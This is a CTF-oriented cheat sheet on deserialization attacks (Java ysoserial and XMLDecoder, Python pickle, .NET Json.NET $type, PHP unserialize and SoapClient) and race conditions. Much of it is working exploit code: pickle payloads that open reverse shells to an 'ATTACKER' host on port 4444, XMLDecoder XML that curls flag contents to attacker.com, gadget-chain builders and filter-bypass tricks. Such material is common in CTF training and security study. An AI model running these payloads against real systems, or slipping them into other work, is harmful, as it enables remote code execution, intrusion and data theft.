# CTF Web - Deserialization & Execution Attacks

For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [server-side.md](server-side.md).

## Table of Contents
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
- [Python Pickle Deserialization](#python-pickle-deserialization)
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
- [Java XMLDecoder Deserialization RCE (HackIM 2016)](#java-xmldecoder-deserialization-rce-hackim-2016)
- [.NET JSON TypeNameHandling Deserialization (DefCamp 2017)](#net-json-typenamehandling-deserialization-defcamp-2017)
- [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
- [PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)](#php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018)
- [Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)](#java-tiedmapentry--lazymap--reflection-hashmap-patch-trend-micro-2018)
- [Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)](#werkzeug-securecookie-pickle-rce-after-secret_key-leak-csaw-2018-finals)
- [PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)](#php-unserialize--double-url-encoding-curl-lfi-fireshell-ctf-2019)
- [Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)](#python-pickle-rce-wrapped-in-rot13base64-tamuctf-2019)

---

## Java Deserialization (ysoserial)

**Pattern:** Java apps using `ObjectInputStream.readObject()` on untrusted input. Serialized Java objects in cookies, POST bodies, or ViewState (base64-encoded, starts with `rO0AB` or hex `aced0005`).

**Detection:**
- Base64 decode suspicious blobs — Java serialized data starts with magic bytes `AC ED 00 05`
- Search for `ObjectInputStream`, `readObject`, `readUnshared` in source
- Content-Type `application/x-java-serialized-object`
- Burp extension: Java Deserialization Scanner

**Key insight:** Deserialization triggers code in `readObject()` methods of classes on the classpath. If a "gadget chain" exists (sequence of classes whose `readObject` → method calls lead to arbitrary execution), the attacker gets RCE without needing to upload code.

```bash
# Generate payloads with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser

# Common gadget chains (try in order):
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1 (Apache Commons BeanUtils)
# URLDNS (no execution — DNS callback for blind detection)
# JRMPClient (triggers JRMP connection)
# Spring1/Spring2 (Spring Framework)

# Blind detection via DNS callback (no RCE needed):
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64

# Send payload
curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.ser
```

**Bypass filters:**
- If `ObjectInputStream` subclass blocklists specific classes, try alternative chains
- `ysoserial-modified` and `GadgetProbe` enumerate available gadget classes
- JNDI injection (Java Naming and Directory Interface): `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI server
- For Java 17+ (module system restrictions): look for application-specific gadgets or Jackson/Fastjson deserialization instead

---

## Python Pickle Deserialization

**Pattern:** Python apps deserializing untrusted data with `pickle.loads()`, `pickle.load()`, or `shelve`. Common in Flask/Django session cookies, cached objects, ML model files (`.pkl`), Redis-stored objects.

**Detection:**
- Base64 blobs containing `\x80\x04\x95` (pickle protocol 4) or `\x80\x05\x95` (protocol 5)
- Source code: `pickle.loads()`, `pickle.load()`, `_pickle`, `shelve.open()`, `joblib.load()`, `torch.load()`
- Flask sessions with `pickle` serializer (vs default `json`)

**Key insight:** Python's `pickle.loads()` calls `__reduce__()` on deserialized objects, which can return `(os.system, ('command',))` — instant RCE. There is NO safe way to deserialize untrusted pickle data.

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# For reverse shell:
class RevShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))

# Using exec for multi-line payloads:
class ExecRCE:
    def __reduce__(self):
        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
```

**Bypass restricted unpicklers:**
- `RestrictedUnpickler` may allowlist specific modules — chain through allowed classes
- If `builtins` allowed: `(__builtins__.__import__, ('os',))` then chain `.system()`
- YAML deserialization (`yaml.load()` without `Loader=SafeLoader`) has similar RCE via `!!python/object/apply:os.system`
- NumPy `.npy`/`.npz` files: `numpy.load(allow_pickle=True)` triggers pickle

---

## Race Conditions (Time-of-Check to Time-of-Use)

**Pattern:** Server checks a condition (balance, registration uniqueness, coupon validity) then performs an action in separate steps. Concurrent requests between check and action bypass the validation.

**Key insight:** Send identical requests simultaneously. The server reads the "before" state for all of them, then applies all changes — each request sees the pre-modification state.

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    """Send n identical requests simultaneously"""
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race('http://target/api/transfer',
    {'to': 'attacker', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50))
```

**Common CTF race condition targets:**
- **Double-spend / balance bypass:** Transfer or purchase endpoint checked `if balance >= amount` → send 50 simultaneous transfers, all see original balance
- **Coupon/code reuse:** Single-use codes validated then marked used → redeem simultaneously before mark
- **Registration uniqueness:** `if not user_exists(name)` → register same username concurrently, one overwrites the other (admin account takeover)
- **File upload + use:** Upload file, server validates then moves → access file between upload and validation (or between validation and deletion)

```bash
# Turbo Intruder (Burp) — most reliable for precise timing
# Or use curl with GNU parallel:
seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
```

**Detection in source code:**
- Non-atomic read-then-write patterns without locks/transactions
- `SELECT ... UPDATE` without `FOR UPDATE` or serializable isolation
- File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
- Redis `GET` then `SET` without `WATCH`/`MULTI`

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

**Pattern:** Chain multiple pickle operations in a single `pickle.loads()` call by stripping the STOP opcode (`\x2e`) from the first payload and concatenating a second payload.

**Key insight:** The pickle VM executes instructions sequentially. Removing the STOP opcode from the first serialized object causes the deserializer to continue executing the second payload's `__reduce__` call. Combined with `os.dup2()` to redirect stdout to the socket FD, this enables output capture from `os.system()` over the network.

```python
import pickle, os

class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# Strip STOP opcode from first payload, concatenate second
payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

**When to use:** Remote pickle deserialization where command output is not returned. Chain `dup2` first to redirect stdout/stderr to the socket, then execute commands.

---

## Java XMLDecoder Deserialization RCE (HackIM 2016)

Java's `XMLDecoder` automatically instantiates classes and invokes methods from XML input. Craft XML to execute arbitrary commands:

```xml
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
    </array>
  </void>
</object>
```

**Key insight:** Unlike binary Java deserialization, XMLDecoder provides a text-based gadget-free path to RCE — no gadget chain needed.

---

## .NET JSON TypeNameHandling Deserialization (DefCamp 2017)

**Pattern:** Json.NET (Newtonsoft.Json) with `TypeNameHandling.All` or `TypeNameHandling.Objects` deserializes the `$type` field to instantiate arbitrary classes. By injecting a `$type` value pointing to a privileged class in the loaded assemblies, an attacker can execute arbitrary code or access protected functionality.

```csharp
// Vulnerable server-side code:
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // UNSAFE: deserializes $type field
};
var obj = JsonConvert.DeserializeObject(userInput, settings);
```

```json
// Basic injection — instantiate a class with a dangerous constructor/property:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  }
}
```

```json
// Simpler: inject a custom application class to escalate privileges:
{
  "$type": "MyApp.Models.AdminCommand, MyApp",
  "Action": "ReadFlag",
  "TargetPath": "/flag.txt"
}
```

```python
import requests, json

# Target: endpoint deserializing JSON with TypeNameHandling.All
payload = {
    "$type": "MyApp.Commands.ExecuteCommand, MyApp",
    "Command": "cat /flag"
}

r = requests.post("http://target/api/process",
                  json=payload,
                  headers={"Content-Type": "application/json"})
print(r.text)
```

**Gadget chains for RCE (ysoserial.net):**
```bash
# Generate Json.NET payload with ysoserial.net:
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
# Common gadgets: ObjectDataProvider, WindowsIdentity, ActivitySurrogateSelector
```

**Detection:** .NET/ASP.NET application, JSON requests. Look for `$type` in API responses (if the server also serializes with TypeNameHandling). Check error messages for Newtonsoft.Json stack traces.

**Key insight:** `$type` in Json.NET can instantiate any class in the loaded assemblies. Any class with dangerous constructors, implicit conversions, or settable properties that trigger side effects becomes an attack surface. Use `ysoserial.net` to enumerate known gadget chains. Defense: use `TypeNameHandling.None` (default) and a custom `ISerializationBinder` allowlist.

---

## PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)

**Pattern:** A post-serialization string filter replaces "where" (5 chars) with "hacker" (6 chars), creating a length mismatch in the serialized string. The serialized length field says N bytes, but after expansion the actual string is longer, causing the PHP deserializer to read past the intended boundary and parse attacker-controlled data as serialized fields.

```php
// The target payload to inject as a serialized field:
$payload = '";}s:5:"photo";s:10:"config.php";}';
// Repeat "where" enough times so the expansion (5->6 per word) overflows
// by exactly strlen($payload) bytes:
$_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
```

**How it works:**
1. Application serializes user input into `s:170:"wherewhere...PAYLOAD";`
2. Filter replaces each "where" (5) with "hacker" (6), adding 1 byte per occurrence
3. After replacement, actual string is longer than the serialized length field
4. PHP deserializer reads exactly `s:170:` bytes, stops mid-string, and finds the injected `";}s:5:"photo";s:10:"config.php";}` as the next serialized field

**Key insight:** Any post-serialization string expansion or contraction creates exploitable length mismatches for object injection. Look for word filters, censorship, or sanitization applied after `serialize()` but before storage/`unserialize()`.

---

### PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)

**Pattern:** When PHP deserializes a `SoapClient` object and a non-existent method is called on it, the `__call()` magic method fires an HTTP request. CRLF injection in the `uri` parameter allows crafting arbitrary HTTP requests to localhost (SSRF). This turns any deserialization sink + method call into a full SSRF primitive.

**How it works:**
1. Attacker crafts a serialized `SoapClient` with CRLF-injected `uri` parameter
2. Application deserializes the object (via `unserialize()`, session handler, or other deserialization sink)
3. When any undefined method is called on the deserialized object, `__call()` triggers
4. `SoapClient` sends an HTTP request to `location` with the crafted `uri` containing injected headers and body

```php
$p = array(
    'uri' => "http://127.0.0.1/\r\nContent-Length:0\r\n\r\nPOST /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=XXX\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nusername=admin&password=nu1ladmin&code=XXX\r\n\r\nPOST /foo\r\n",
    'location' => 'http://127.0.0.1/'
);
$soap = new SoapClient(null, $p);
// When getcountry() called on deserialized object -> triggers __call() -> sends crafted HTTP
```

```python
import requests

# Generate the serialized SoapClient payload
# The CRLF in uri smuggles a complete second HTTP request
php_serialize_script = '''
<?php
$target = "http://127.0.0.1/";
$post_body = "username=admin&password=nu1ladmin&code=XXX";
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=target_session_id'
);
$payload = array(
    'uri' => "http://127.0.0.1/\\r\\nContent-Length:0\\r\\n\\r\\nPOST /index.php?action=login HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n" . implode("\\r\\n", $headers) . "\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: " . strlen($post_body) . "\\r\\n\\r\\n" . $post_body . "\\r\\n\\r\\nPOST /foo\\r\\n",
    'location' => $target
);
echo serialize(new SoapClient(null, $payload));
?>
'''

# The serialized payload is then injected into the deserialization sink
# e.g., via session manipulation, cookie injection, or POST parameter
```

**Common trigger chains:**
```text
unserialize(user_input) → $obj->anyMethod() → SoapClient::__call() → HTTP request
session_start() with custom handler → SoapClient in session → __call() on access
```

**Key insight:** PHP's SoapClient `__call()` magic method fires HTTP requests when any undefined method is called. CRLF injection in the URI parameter smuggles complete HTTP requests, enabling authenticated SSRF to localhost. This is especially powerful when combined with other PHP deserialization vectors (session handlers, `phar://` wrappers) since `SoapClient` is a built-in PHP class requiring no additional libraries. Look for any code path where a deserialized object has a method called on it.

---

## Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)

**Pattern:** Custom Java gadget chain that calls a static method (`Flag.getFlag()`) without any off-the-shelf ysoserial gadget. The chain uses `TiedMapEntry` wrapping a `LazyMap` whose factory is a `ChainedTransformer(ConstantTransformer(Flag.class), InvokerTransformer("getMethod", ...), InvokerTransformer("invoke", ...))`. Because LazyMap evaluates its factory on `get()` before serialization completes, the payload must smuggle the TiedMapEntry into a parent HashMap *after* building it — done by reflecting into `HashMap.table` and writing the entry directly.

```java
// Build the transformer chain (classic Commons Collections)
Transformer[] chain = new Transformer[] {
    new ConstantTransformer(Flag.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getFlag", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
};
Map inner = LazyMap.decorate(new HashMap(), new ChainedTransformer(chain));
TiedMapEntry entry = new TiedMapEntry(inner, "trigger");

// Wrap in HashMap WITHOUT triggering LazyMap resolution:
HashMap<Object, Object> outer = new HashMap<>();
outer.put("placeholder", "x");            // force allocation of table[]
Map.Entry[] table = (Map.Entry[]) Whitebox.getInternalState(outer, "table");
table[0] = new HashMap.Node(0, "payload", entry, null);
Whitebox.setInternalState(outer, "table", table);

// Serialize and send
ByteArrayOutputStream out = new ByteArrayOutputStream();
new ObjectOutputStream(out).writeObject(outer);
byte[] payload = out.toByteArray();
```

**Key insight:** The Commons Collections `LazyMap` + `ChainedTransformer` primitive can call any static method, not just `Runtime.exec`. When a CTF challenge adds its own `Flag.getFlag()` helper expecting the JVM to enforce access control, the same gadget chain used for RCE gives you direct method invocation. The tricky part is that calling `outer.put(payload, "x")` while building the HashMap would immediately resolve the LazyMap and leak the flag to the builder process — use reflection (`Whitebox.setInternalState` from PowerMock, or raw `Field.setAccessible(true)`) to write the TiedMapEntry into `HashMap.table` after the map is otherwise populated.

**References:** Trend Micro CTF 2018 — Raimund Genes Cup Misc 300, writeup 11293

---

## Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)

**Pattern:** `werkzeug.contrib.securecookie.SecureCookie` serializes session data with `pickle`. Once the Flask `SECRET_KEY` leaks (for example via SSRF reading `/proc/self/environ`), any cookie re-signs cleanly, so a `__reduce__` gadget fires on deserialization.

```python
import pickle, subprocess
from werkzeug.contrib.securecookie import SecureCookie

class Pwn:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))

cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
# Set Cookie: session=<cookie> and read the flag from the response
```

**Key insight:** Any framework that mixes `pickle` with HMAC-signed cookies is a SECRET_KEY leak away from RCE. Flask's default `itsdangerous` uses JSON, but older apps on `SecureCookie` or custom signers still ship pickle.

**References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144

---

## PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)

**Pattern:** A PHP endpoint unserializes `$_GET['gg']`, and the gadget's `__destruct()` calls `doit()` which `curl`s `$this->url`. A blacklist blocks `.php`/`.txt`/`.html` via `strpos($this->url, $ext)`, but PHP decodes the query string once before `unserialize` — anything double URL-encoded (e.g. `%252e` for `.`) survives that decode as literal `%2e`, misses the `strpos` check, then gets decoded a second time by curl before the file is read.

```php
class SHITS {
    private $url    = "file:///var/www/html/config.php";
    private $method = "doit";
    private $addr; private $host; private $name;
}
// Replace '.' with '%252e' AFTER serialize(), then fix the string length.
// "file:///var/www/html/config.php" (31) -> "file:///var/www/html/config%252ephp" (35 bytes on the wire,
// 33 chars after the first decode), so set s:33 in the serialized blob.
print str_replace('.', '%252e', urlencode(serialize(new SHITS)));
```
```http
GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7B...s%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22...%7D
```

**Key insight:** When a filter uses `strpos`/`preg_match` *before* URL decoding but the downstream consumer decodes again, double-encoded payloads bypass text-based blacklists. With PHP `unserialize`, remember the `s:<len>` prefix must match the byte count *after* PHP's first URL decode (33 here, not 31 or 35) or the object fails to deserialize silently.

**References:** FireShell CTF 2019 — Vice, writeup 13221

---

## Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)

**Pattern:** Backup/restore endpoint round-trips Python objects through `pickle`, but encodes the result as `rot13(base64(pickle.dumps(obj)))` to obscure the format. The wrapper does not change exploitability — compose the inverse transforms before sending a `__reduce__` payload:

```python
import base64, codecs, pickle, subprocess

def make_backup(obj):
    s = base64.b64encode(pickle.dumps(obj)).decode()
    return codecs.encode(s, 'rot-13')

def parse_backup(blob):
    s = codecs.decode(blob, 'rot-13')
    return pickle.loads(base64.b64decode(s))

class RunBinSh:
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh',),))

print(make_backup(RunBinSh()))
# -> tNAwp3IvpUWiL2Im... paste into the "Load your backed up list" prompt
```
Send the output into the app's load endpoint; pickle instantiates `subprocess.Popen(('/bin/sh',))` on deserialize and you land in a shell.

**Key insight:** Obfuscation layers like ROT13, hex, zlib, or XOR do not change the pickle threat model — just compose the inverse transforms before sending. Identify the wrapper by round-tripping a known value (e.g. encode an empty list locally, compare against the server output); any 1:1 byte-for-byte mapping is a substitution cipher and trivially invertible.

**References:** TAMUctf 2019 — VeggieTales, writeup 13424

---
